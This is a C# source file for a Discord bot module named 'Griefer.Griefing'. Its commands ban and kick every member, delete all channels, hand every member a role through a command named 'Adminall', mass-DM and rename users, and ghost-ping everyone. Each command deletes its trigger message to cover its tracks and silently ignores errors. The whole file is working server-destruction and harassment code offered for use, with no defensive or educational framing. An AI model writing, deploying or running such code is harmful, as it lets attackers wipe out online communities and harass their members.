using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System;
using System.Linq;
using System.Threading.Tasks;

namespace Griefer.Griefing
{
    public class All : ModuleBase<SocketCommandContext>
    {
        [Command("Adminall")]
        public async Task AdminallAsync()
        {
            await Context.Message.DeleteAsync();
            var cmduser = Context.User as SocketGuildUser;
            var currentguild = Context.Guild;
            foreach (var users in Context.Guild.Users)
            {
                try
                {
                    var role = cmduser.Guild.Roles.FirstOrDefault(x => x.Name == $"-");
                    await users.AddRoleAsync(role);
                }
                catch (Exception)
                {
                    /// /// Blank /// /// 
                }
            }
        }
        [Command("Banall")]
        public async Task BanAllAsync()
        {
            await Context.Message.DeleteAsync();
            var cmduser = Context.User as SocketGuildUser;
            await cmduser.SendMessageAsync("> **Started the Proccess!**");
            foreach (var users in Context.Guild.Users)
            {
                try
                {
                    await Context.Guild.AddBanAsync(users, 0, "jaja");
                }
                catch (Exception)
                {
                    /// /// Blank /// /// 
                }
            }
        }
        [Command("DeleteAllChannels")]
        public async Task DeleteAllChannelsAsync()
        {
            await Context.Message.DeleteAsync();
            var cmduser = Context.User as SocketGuildUser;
            await cmduser.SendMessageAsync("> **Started the Proccess!**");
            foreach (var channels in Context.Guild.Channels)
            {
                await channels.DeleteAsync();
            }
        }
        [Command("Dmall")]
        public async Task DMallAsync([Remainder]string message = null)
        {
            if (message == null)
            {
                await Context.Message.DeleteAsync();
                await ReplyAsync($"**Message Argument is Missing**");
            }
            else
            {
                await Context.Message.DeleteAsync();
                foreach (var users in Context.Guild.Users)
                {
                    try
                    {
                        await users.SendMessageAsync(message);
                    }
                    catch (Exception)
                    {
                        /// /// Blank /// /// 
                    }
                }
            }
        }
        [Command("Kickall")]
        public async Task KickAllAsync()
        {
            await Context.Message.DeleteAsync();
            var cmduser = Context.User as SocketGuildUser;
            await cmduser.SendMessageAsync("> **Started the Proccess!**");
            foreach (var users in Context.Guild.Users)
            {
                try
                {
                    await users.KickAsync("jaja");
                }
                catch (Exception)
                {
                    /// /// Blank /// /// 
                }
            }
        }
        [Command("Nickall")]
        public async Task NickAllAsync([Remainder] string NickName = null)
        {
            if (NickName == null)
            {
                await Context.Message.DeleteAsync();
                await ReplyAsync($"**Nickname Argument is Missing**");
            }
            else
            {
                await Context.Message.DeleteAsync();
                var cmduser = Context.User as SocketGuildUser;
                await cmduser.SendMessageAsync("> **Started the Proccess!**");
                foreach (var users in Context.Guild.Users)
                {
                    try
                    {
                        await users.ModifyAsync(x => x.Nickname = $"{NickName}");
                    }
                    catch (Exception)
                    {
                        /// /// Blank /// /// 
                    }
                }
            }
        }
        [Command("Mentionall")]
        public async Task MentionAllAsync()
        {
            await Context.Message.DeleteAsync();
            foreach (var users in Context.Guild.Users)
            {
                try
                {
                   var message = await Context.Channel.SendMessageAsync($"{users.Mention}");
                    /// /// Ghost Ping /// /// xc
                    await message.DeleteAsync();
                }
                catch (Exception)
                {
                    /// /// Blank /// /// 
                }
            }
        }
    }
}








